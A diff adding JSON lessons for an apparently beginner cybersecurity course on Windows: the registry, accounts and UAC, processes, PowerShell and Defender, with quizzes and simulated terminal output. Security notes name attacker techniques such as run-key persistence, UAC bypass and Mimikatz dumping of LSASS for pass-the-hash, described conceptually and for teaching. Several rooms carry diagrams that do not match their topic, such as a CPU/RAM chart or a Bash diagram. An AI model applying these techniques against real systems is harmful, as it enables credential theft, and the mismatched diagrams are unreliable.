+        "question": "Which Windows Registry hive holds configuration settings that apply machine-wide to all users and hardware devices?",
+        "options": [
+          "HKCU (HKEY_CURRENT_USER)",
+          "HKLM (HKEY_LOCAL_MACHINE)",
+          "HKCR (HKEY_CLASSES_ROOT)",
+          "HKCC (HKEY_CURRENT_CONFIG)"
+        ],
+        "correctIndex": 1,
+        "hint": "HKEY_LOCAL_MACHINE.",
+        "explanation": "HKLM stores settings applicable to the local machine across all user accounts."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Query Windows root directory variable",
+        "instruction": "Run `echo %SYSTEMROOT%` in the terminal.",
+        "hints": [
+          "Type: `echo %SYSTEMROOT%`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers establish persistence on Windows machines by adding registry run keys (e.g. `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`). When Windows boots up, any executable path registered in that key runs automatically as a background process!",
+    "id": "room-15",
+    "nextRoomId": "room-16"
+  },
+  {
+    "stage": 3,
+    "level": 3,
+    "levelTitle": "Level 3 \u2014 Windows Fundamentals",
+    "title": "Windows Users, Groups & Access Controls",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 15: Windows Architecture & The NTFS Filesystem",
+    "whyAreYouHere": "User account management is the foundation of enterprise Windows security. In corporate environments, Windows computers are joined to an Active Directory domain where identity, passwords, and permissions are managed centrally. In this room, you will learn the difference between Local Accounts and Domain Accounts, User Account Control (UAC), and NTFS Access Control Lists.",
+    "objectives": [
+      "Differentiate between Local User Accounts and Active Directory Domain Accounts",
+      "Understand the special built-in accounts: Administrator, Guest, and NT AUTHORITY\\SYSTEM",
+      "Learn how User Account Control (UAC) prompts protect against unauthorized administrative changes",
+      "Understand NTFS Discretionary Access Control Lists (DACLs) and ACEs",
+      "Audit user accounts and group memberships using `net user` and `net localgroup`"
+    ],
+    "vocabulary": [
+      {
+        "term": "Local Account",
+        "definition": "A user account stored on the local machine's SAM (Security Account Manager) database, valid only on that specific computer."
+      },
+      {
+        "term": "Domain Account",
+        "definition": "A centralized enterprise account stored in Active Directory on a Domain Controller, valid across thousands of corporate workstations."
+      },
+      {
+        "term": "NT AUTHORITY\\SYSTEM",
+        "definition": "The supreme operating system account on Windows, possessing higher privileges than a local Administrator."
+      },
+      {
+        "term": "UAC (User Account Control)",
+        "definition": "A security feature that prompts users for confirmation or credentials before allowing an app to run with administrative tokens."
+      },
+      {
+        "term": "DACL (Discretionary Access Control List)",
+        "definition": "A list of Access Control Entries (ACEs) attached to every Windows object defining which users have Read, Write, or Full Control permissions."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"30\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"70\" fill=\"#38bdf8\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">CPU</text>\n  <text x=\"100\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Arithmetic &amp; Logic</text>\n  <text x=\"100\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Executes instructions</text>\n\n  <path d=\"M 170 90 L 230 90\" stroke=\"#38bdf8\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"200\" y=\"80\" fill=\"#38bdf8\" font-size=\"10\" text-anchor=\"middle\">BUS</text>\n\n  <rect x=\"230\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"70\" fill=\"#10b981\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">RAM</text>\n  <text x=\"300\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Volatile Memory</text>\n  <text x=\"300\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Fast working set</text>\n\n  <path d=\"M 370 90 L 430 90\" stroke=\"#10b981\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"400\" y=\"80\" fill=\"#10b981\" font-size=\"10\" text-anchor=\"middle\">NVMe</text>\n\n  <rect x=\"430\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"500\" y=\"70\" fill=\"#f59e0b\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">SSD / Storage</text>\n  <text x=\"500\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Non-Volatile</text>\n  <text x=\"500\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Permanent files</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Local Accounts vs Domain Accounts",
+        "content": "\u2022 **Local Accounts**: Managed on the individual computer. Credentials live in `C:\\Windows\\System32\\config\\SAM`. A local account named `alice` on Workstation-1 cannot log into Workstation-2.\n\u2022 **Domain Accounts (Active Directory)**: In enterprise networks, computers join a **Domain**. A Domain Controller (DC) running Kerberos authenticates users. You can log into any workstation in the building with your single corporate username and password (`CORP\\alice`)."
+      },
+      {
+        "title": "2. Administrator vs NT AUTHORITY\\SYSTEM",
+        "content": "Windows has two levels of supreme power:\n\n\u2022 **Administrator**: The administrative user account. Can install software, manage users, and modify system settings.\n\u2022 **NT AUTHORITY\\SYSTEM**: The operating system identity itself. Even local Administrators cannot access certain registry keys or kernel memory without elevating to SYSTEM privileges!\n\nIn penetration testing, achieving `NT AUTHORITY\\SYSTEM` on a Windows host is the equivalent of getting `root` on Linux."
+      },
+      {
+        "title": "3. User Account Control (UAC)",
+        "content": "In older Windows versions (Windows XP), logging in as an administrator meant every program ran with full administrative rights. If you opened a malicious email attachment, it instantly infected the whole system!\n\nWindows Vista introduced **User Account Control (UAC)**. Even when an Administrator logs in, Windows gives their everyday processes an **unprivileged token**. Only when a program needs administrative changes does Windows display a UAC prompt asking for permission."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Enumerating Users with the 'net' command",
+        "codeOrDiagram": "C:\\> net user\nUser accounts for \\\\WORKSTATION-01\n-------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\nHelpAssistant            cadet                    WDAGUtilityAccount\n\nC:\\> net localgroup Administrators\nMembers\n-------------------------------------------------------------------\nAdministrator",
+        "explanation": "`net user` lists all local user accounts; `net localgroup Administrators` reveals who possesses administrative rights."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `whoami /groups` to simulate inspecting active group memberships and security identifiers (SIDs):",
+      "initialCommand": "",
+      "expectedCommand": "whoami /groups",
+      "simulatedOutput": "GROUP INFORMATION\n-----------------\nGroup Name                                  Type             SID\nMandatory Label\\Medium Mandatory Level      Label            S-1-16-8192\n[+] Integrity Level verified: Running at Medium Mandatory Level (Standard User).",
+      "explanation": "`whoami /groups` reveals the security token groups and integrity level assigned to the active shell."
+    },
+    "questions": [
+      {
+        "id": "q-16-1",
+        "type": "exact",
+        "question": "What is the supreme Windows operating system account name that has higher privileges than a local Administrator (format: SYSTEM)?",
+        "visualSlots": "_ _ _ _ _ _",
+        "acceptedAnswers": [
+          "SYSTEM",
+          "NT AUTHORITY\\SYSTEM"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Six letters: S-Y-S-T-E-M.",
+        "explanation": "NT AUTHORITY\\SYSTEM is the highest privilege account in Windows."
+      },
+      {
+        "id": "q-16-2",
+        "type": "multiple-choice",
+        "question": "Which Windows security mechanism prompts users with a dialog box when an application requests elevated administrative tokens?",
+        "options": [
+          "BitLocker",
+          "User Account Control (UAC)",
+          "Windows Defender",
+          "AppLocker"
+        ],
+        "correctIndex": 1,
+        "hint": "UAC abbreviation.",
+        "explanation": "User Account Control (UAC) gates administrative privilege elevation behind user confirmation."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect group token information",
+        "instruction": "Run `whoami /groups` in the terminal.",
+        "hints": [
+          "Type: `whoami /groups`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers who gain an initial foothold as a standard user search for 'UAC Bypass' vulnerabilities or unquoted service path misconfigurations to elevate their privileges to `NT AUTHORITY\\SYSTEM`.",
+    "id": "room-16",
+    "nextRoomId": "room-17"
+  },
+  {
+    "stage": 3,
+    "level": 3,
+    "levelTitle": "Level 3 \u2014 Windows Fundamentals",
+    "title": "Windows Processes, Services & Task Manager",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 16: Windows Users, Groups & Access Controls",
+    "whyAreYouHere": "Malware does not announce itself with a flashing banner; it hides among legitimate Windows operating system processes like `svchost.exe`, `explorer.exe`, or `lsass.exe`. Security analysts and incident responders must know what normal Windows processes look like so they can immediately spot abnormal processes or rogue background services.",
+    "objectives": [
+      "Navigate the Windows Task Manager (Processes, Performance, Startup apps, Services tabs)",
+      "Identify core legitimate Windows system processes (smss, csrss, wininit, lsass, svchost)",
+      "Understand Windows Services and manage them using `services.msc` and `sc.exe`",
+      "Learn about Dynamic Link Libraries (DLLs) and DLL Search Order Hijacking",
+      "Inspect running processes from the command line using `tasklist` and terminate with `taskkill`"
+    ],
+    "vocabulary": [
+      {
+        "term": "svchost.exe (Service Host)",
+        "definition": "A shared system host process for Windows services that run from Dynamic Link Libraries (.dll files). Multiple instances run simultaneously."
+      },
+      {
+        "term": "lsass.exe (Local Security Authority)",
+        "definition": "The critical security subsystem process responsible for verifying user logins, handling password changes, and storing active Kerberos/NTLM authentication tickets in memory."
+      },
+      {
+        "term": "Task Manager",
+        "definition": "The built-in Windows GUI utility used to monitor system performance, view running processes, and inspect resource consumption."
+      },
+      {
+        "term": "tasklist",
+        "definition": "The Windows command-line utility that displays all currently running applications and processes."
+      },
+      {
+        "term": "DLL (Dynamic Link Library)",
+        "definition": "A shared library of compiled code and functions that multiple programs can load into memory simultaneously to save RAM."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"30\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"70\" fill=\"#38bdf8\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">CPU</text>\n  <text x=\"100\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Arithmetic &amp; Logic</text>\n  <text x=\"100\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Executes instructions</text>\n\n  <path d=\"M 170 90 L 230 90\" stroke=\"#38bdf8\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"200\" y=\"80\" fill=\"#38bdf8\" font-size=\"10\" text-anchor=\"middle\">BUS</text>\n\n  <rect x=\"230\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"70\" fill=\"#10b981\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">RAM</text>\n  <text x=\"300\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Volatile Memory</text>\n  <text x=\"300\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Fast working set</text>\n\n  <path d=\"M 370 90 L 430 90\" stroke=\"#10b981\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"400\" y=\"80\" fill=\"#10b981\" font-size=\"10\" text-anchor=\"middle\">NVMe</text>\n\n  <rect x=\"430\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"500\" y=\"70\" fill=\"#f59e0b\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">SSD / Storage</text>\n  <text x=\"500\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Non-Volatile</text>\n  <text x=\"500\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Permanent files</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Core Legitimate Windows Processes",
+        "content": "Every Windows system runs several critical core processes:\n\n\u2022 **`smss.exe` (Session Manager)**: The very first userspace process started by the kernel.\n\u2022 **`csrss.exe` (Client/Server Runtime Subsystem)**: Manages console windows and creates/deletes threads.\n\u2022 **`wininit.exe`**: Starts background services and the Local Security Authority.\n\u2022 **`lsass.exe` (Local Security Authority Subsystem Service)**: Extremely high-value security process! It validates credentials, enforces security policies, and caches login tokens in RAM. (Attackers love dumping LSASS memory using tools like Mimikatz to extract plain-text passwords!).\n\u2022 **`svchost.exe` (Generic Host for Services)**: You will see 20 to 80 instances of `svchost.exe` running. Each instance hosts different background Windows services (Windows Update, Audio, Networking)."
+      },
+      {
+        "title": "2. Windows Services: services.msc and sc.exe",
+        "content": "Windows services run in the background without needing a user to log in:\n\n\u2022 Startup types include: **Automatic** (starts with OS), **Manual** (starts when requested), and **Disabled**.\n\u2022 In the GUI, view services using `services.msc`.\n\u2022 In the command line, query and configure services using `sc.exe`:\n  `sc query Spooler` (checks the Print Spooler service status).\n  `sc stop Spooler` (stops the service)."
+      },
+      {
+        "title": "3. Command-Line Process Management: tasklist and taskkill",
+        "content": "\u2022 **`tasklist`**: Lists all active processes with their Image Name, PID, Session, and Memory usage:\n  `tasklist /FI \"IMAGENAME eq svchost.exe\"` (filters for all svchost processes).\n\n\u2022 **`taskkill`**: Terminates a process:\n  `taskkill /PID 4210 /F` (the `/F` flag forces termination)."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Listing processes with tasklist",
+        "codeOrDiagram": "C:\\> tasklist /FI \"USERNAME eq cadet\"\n\nImage Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\ncmd.exe                       3040 Console                    1      4,820 K\nconhost.exe                   3048 Console                    1      8,112 K\ntasklist.exe                  4588 Console                    1      7,940 K",
+        "explanation": "Filtered `tasklist` showing only processes running under the 'cadet' user session."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `tasklist` in the terminal to inspect the active Windows process list:",
+      "initialCommand": "",
+      "expectedCommand": "tasklist",
+      "simulatedOutput": "Image Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          8 K\nSystem                           4 Services                   0        140 K\nsvchost.exe                    840 Services                   0     22,140 K\ncmd.exe                       3040 Console                    1      4,820 K\n[+] Process enumeration complete: 4 active processes identified.",
+      "explanation": "`tasklist` displays the Windows image names and PIDs."
+    },
+    "questions": [
+      {
+        "id": "q-17-1",
+        "type": "exact",
+        "question": "Which Windows security process is responsible for enforcing security policies, verifying logins, and storing credential tickets in memory?",
+        "visualSlots": "_ _ _ _ _ _ _ _ _",
+        "acceptedAnswers": [
+          "lsass.exe",
+          "lsass"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Local Security Authority Subsystem Service (lsass.exe).",
+        "explanation": "lsass.exe handles user authentication and session security tokens."
+      },
+      {
+        "id": "q-17-2",
+        "type": "multiple-choice",
+        "question": "Which generic host process name is used in Windows to run services compiled as Dynamic Link Libraries (.dll files)?",
+        "options": [
+          "explorer.exe",
+          "svchost.exe",
+          "notepad.exe",
+          "winlogon.exe"
+        ],
+        "correctIndex": 1,
+        "hint": "Service Host executable.",
+        "explanation": "svchost.exe hosts shared Windows services loaded from DLLs."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect active tasks",
+        "instruction": "Execute `tasklist` in the terminal.",
+        "hints": [
+          "Type: `tasklist`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers dump the memory of `lsass.exe` using tools like Mimikatz or Task Manager to extract cached password hashes (NTLM) and Kerberos tickets, which they then use in 'Pass-the-Hash' attacks to move laterally across enterprise networks.",
+    "id": "room-17",
+    "nextRoomId": "room-18"
+  },
+  {
+    "stage": 3,
+    "level": 3,
+    "levelTitle": "Level 3 \u2014 Windows Fundamentals",
+    "title": "Command Prompt (CMD) vs PowerShell",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 17: Windows Processes, Services & Task Manager",
+    "whyAreYouHere": "Windows provides two primary command-line environments: the legacy Command Prompt (`cmd.exe`) and the modern, object-oriented PowerShell (`powershell.exe`). In this room, you will learn the core syntax differences between them, why PowerShell is an indispensable automation and administration tool, and how penetration testers use PowerShell cmdlets for post-exploitation.",
+    "objectives": [
+      "Understand the difference between legacy text-based CMD and object-oriented PowerShell",
+      "Learn PowerShell Cmdlet syntax: Verb-Noun pairs (e.g., `Get-Process`, `Set-ExecutionPolicy`)",
+      "Understand PowerShell pipeline objects vs Linux plain-text streams",
+      "Compare common commands between CMD and PowerShell (`dir` vs `Get-ChildItem`)",
+      "Learn about PowerShell Execution Policies and script execution"
+    ],
+    "vocabulary": [
+      {
+        "term": "Command Prompt (CMD)",
+        "definition": "The legacy Windows command-line interpreter, rooted in MS-DOS, outputting raw text streams."
+      },
+      {
+        "term": "PowerShell",
+        "definition": "A modern task automation and configuration framework consisting of a command-line shell and scripting language built on .NET."
+      },
+      {
+        "term": "Cmdlet",
+        "definition": "A lightweight PowerShell command adhering to a standard Verb-Noun naming pattern (e.g. Get-Service, Stop-Process)."
+      },
+      {
+        "term": ".NET Object Pipeline",
+        "definition": "Unlike Linux pipes that pass unstructured raw text, PowerShell pipes pass rich .NET objects with properties and methods."
+      },
+      {
+        "term": "Execution Policy",
+        "definition": "A safety feature in PowerShell that controls the conditions under which configuration files and scripts are permitted to run."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Text Streams (CMD) vs Objects (PowerShell)",
+        "content": "\u2022 **CMD / Linux Bash**: When a command outputs data, it outputs **plain text characters**. If you want to extract just the IP address or process memory from a command, you have to write complex text-filtering regexes using `grep`, `awk`, or `sed`.\n\u2022 **PowerShell**: Pipes pass **rich .NET objects**! When you run `Get-Process`, PowerShell does not output text\u2014it outputs an array of Process Objects. Each object has structured properties like `.ProcessName`, `.Id`, `.CPU`, and `.Handles`.\n\nYou can filter directly by property without text parsing:\n`Get-Process | Where-Object { $_.CPU -gt 100 }`"
+      },
+      {
+        "title": "2. Cmdlet Syntax: Verb-Noun",
+        "content": "PowerShell commands are called **Cmdlets** (pronounced 'command-lets') and use a consistent **Verb-Noun** naming standard:\n\n\u2022 `Get-Service`: Retrieve services.\n\u2022 `Start-Service -Name \"wuauserv\"`: Start the Windows Update service.\n\u2022 `Get-NetIPAddress`: Query network interface IP addresses.\n\u2022 `Get-Content C:\\notes.txt`: Read file contents (equivalent to `cat`).\n\u2022 `Set-Content C:\\out.txt -Value \"Done\"`: Write to file."
+      },
+      {
+        "title": "3. CMD vs PowerShell Comparison Table",
+        "content": "| Action | Legacy CMD (`cmd.exe`) | Modern PowerShell | Linux Equivalent |\n|---|---|---|---|\n| List files | `dir` | `Get-ChildItem` (alias `ls` / `dir`) | `ls -la` |\n| Current path | `cd` | `Get-Location` (alias `pwd`) | `pwd` |\n| View file | `type file.txt` | `Get-Content file.txt` (alias `cat`) | `cat file.txt` |\n| Current user | `whoami` | `whoami` / `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name` | `whoami` |\n| IP Config | `ipconfig /all` | `Get-NetIPConfiguration` | `ip a` |"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "PowerShell Object Filtering",
+        "codeOrDiagram": "PS C:\\> Get-Service | Where-Object { $_.Status -eq \"Running\" } | Select-Object -First 3\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  Appinfo            Application Information\nRunning  AudioEndpointBuild Windows Audio Endpoint Builder\nRunning  Audiosrv           Windows Audio",
+        "explanation": "Piping structured objects into `Where-Object` allows instant property filtering without regex text parsing."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `Get-Service` to simulate querying the Windows service status via PowerShell:",
+      "initialCommand": "",
+      "expectedCommand": "Get-Service",
+      "simulatedOutput": "Status   Name               DisplayName\n------   ----               -----------\nRunning  EventLog           Windows Event Log\nRunning  MpsSvc             Windows Defender Firewall\nStopped  Spooler            Print Spooler\n[+] PowerShell cmdlet executed: Active services enumerated.",
+      "explanation": "`Get-Service` returns .NET service controller objects."
+    },
+    "questions": [
+      {
+        "id": "q-18-1",
+        "type": "exact",
+        "question": "What standard Verb-Noun naming convention does PowerShell use for its built-in commands (e.g. Get-Process)?",
+        "visualSlots": "_ _ _ _ - _ _ _ _",
+        "acceptedAnswers": [
+          "Verb-Noun",
+          "verb noun"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Action word followed by object word: Verb-Noun.",
+        "explanation": "PowerShell commands strictly follow the Verb-Noun naming convention."
+      },
+      {
+        "id": "q-18-2",
+        "type": "multiple-choice",
+        "question": "What is the primary technical difference between Linux/CMD pipes and PowerShell pipes?",
+        "options": [
+          "Linux pipes are faster because they use 64-bit encryption",
+          "PowerShell pipes pass structured .NET objects with properties rather than raw text streams",
+          "PowerShell pipes can only be used by the Administrator account",
+          "CMD pipes cannot write output to files"
+        ],
+        "correctIndex": 1,
+        "hint": "PowerShell passes structured objects.",
+        "explanation": "PowerShell pipes pass fully formed .NET objects rather than unparsed character streams."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Query services with PowerShell",
+        "instruction": "Execute `Get-Service` in the terminal.",
+        "hints": [
+          "Type: `Get-Service`"
+        ]
+      }
+    ],
+    "securityConnection": "Attackers heavily leverage 'Living off the Land' (LotL) techniques\u2014using built-in administrative tools like PowerShell instead of uploading malicious binaries. Because PowerShell is digitally signed by Microsoft, its execution often flies under the radar of traditional signature-based antivirus!",
+    "id": "room-18",
+    "nextRoomId": "room-19"
+  },
+  {
+    "stage": 3,
+    "level": 3,
+    "levelTitle": "Level 3 \u2014 Windows Fundamentals",
+    "title": "Windows Security Controls & Event Logs",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 18: Command Prompt (CMD) vs PowerShell",
+    "whyAreYouHere": "Windows includes a comprehensive suite of defensive technologies: Windows Defender Antivirus, the Windows Filtering Platform (Firewall), BitLocker drive encryption, and Windows Event Logs. In this room, you will learn how these defensive layers protect workstations and discover the critical Event IDs that security operations center (SOC) analysts monitor to detect intrusions.",
+    "objectives": [
+      "Understand Windows Defender Antivirus, Real-Time Protection, and Cloud-Delivered Protection",
+      "Learn Windows Defender Firewall rules (Inbound vs Outbound filtering)",
+      "Understand BitLocker full-disk encryption and the Trusted Platform Module (TPM)",
+      "Explore the Windows Event Viewer (`eventvwr.msc`) and key security event logs",
+      "Identify high-priority Windows Security Event IDs (4624 Logon, 4625 Failed Logon, 4688 Process Creation)"
+    ],
+    "vocabulary": [
+      {
+        "term": "Microsoft Defender Antivirus",
+        "definition": "The built-in next-generation antimalware component of Windows that provides real-time protection, behavioral monitoring, and heuristic scanning."
+      },
+      {
+        "term": "Windows Event Viewer",
+        "definition": "The administrative tool (`eventvwr.msc`) used to browse and view system, security, and application event logs stored in .evtx format."
+      },
+      {
+        "term": "Event ID 4624",
+        "definition": "The Windows Security Event Log identifier generated whenever an account successfully logs onto the computer."
+      },
+      {
+        "term": "Event ID 4625",
+        "definition": "The Windows Security Event Log identifier generated when an account fails to log on (vital for detecting brute-force attacks)."
+      },
+      {
+        "term": "BitLocker",
+        "definition": "The native Windows full-disk encryption feature that encrypts entire hard drive volumes to prevent data theft if a laptop is physically stolen."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"30\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"70\" fill=\"#38bdf8\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">CPU</text>\n  <text x=\"100\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Arithmetic &amp; Logic</text>\n  <text x=\"100\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Executes instructions</text>\n\n  <path d=\"M 170 90 L 230 90\" stroke=\"#38bdf8\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"200\" y=\"80\" fill=\"#38bdf8\" font-size=\"10\" text-anchor=\"middle\">BUS</text>\n\n  <rect x=\"230\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"70\" fill=\"#10b981\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">RAM</text>\n  <text x=\"300\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Volatile Memory</text>\n  <text x=\"300\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Fast working set</text>\n\n  <path d=\"M 370 90 L 430 90\" stroke=\"#10b981\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"400\" y=\"80\" fill=\"#10b981\" font-size=\"10\" text-anchor=\"middle\">NVMe</text>\n\n  <rect x=\"430\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"500\" y=\"70\" fill=\"#f59e0b\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">SSD / Storage</text>\n  <text x=\"500\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Non-Volatile</text>\n  <text x=\"500\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Permanent files</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Windows Defender & Endpoint Security",
+        "content": "Windows Defender has evolved into a formidable security suite:\n\n\u2022 **Real-Time Protection**: Intercepts every file downloaded, extracted, or executed, scanning it against known virus signatures and cloud intelligence.\n\u2022 **AMSI (Antimalware Scan Interface)**: An interface that allows applications (like PowerShell or Office macros) to pass scripts to Defender *after* they are de-obfuscated in memory before execution!\n\u2022 **Attack Surface Reduction (ASR)**: Blocks common malware techniques, such as Office documents launching executable child processes."
+      },
+      {
+        "title": "2. Windows Event Logs: The Security Flight Recorder",
